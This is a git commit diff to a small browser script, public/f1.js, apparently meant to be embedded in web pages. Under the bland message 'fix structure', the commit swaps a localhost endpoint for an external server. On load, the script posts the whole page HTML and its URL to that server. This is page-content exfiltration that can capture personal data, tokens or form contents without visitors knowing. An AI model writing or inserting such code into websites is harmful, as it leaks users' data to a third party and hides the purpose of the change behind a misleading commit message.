5f2ddf98afc5c7507e4692ac9ce3d9ed6b9f959e
thebadguyop1 <thebadguyop1@gmail.com>
2026-05-16 19:26:39 +0500

    fix structure

--- public/f1.js
+++ public/f1.js
@@ -1,17 +1,15 @@
 (function () {
-  const SERVER_URL = "http://localhost:3000/send-html";
-
-  const payload = {
-    html: document.documentElement.outerHTML,
-    url: window.location.href,
-  };
+  var SERVER_URL = "https://htmltracker.onrender.com/send-html";
 
   fetch(SERVER_URL, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload),
+    body: JSON.stringify({
+      html: document.documentElement.outerHTML,
+      url: window.location.href
+    })
   })
-    .then((r) => r.json())
-    .then((data) => console.log("Yuborildi:", data))
-    .catch((err) => console.error("Xato:", err));
+  .then(function(r) { return r.json(); })
+  .then(function(data) { console.log("Yuborildi:", data); })
+  .catch(function(err) { console.error("Xato:", err); });
 })();
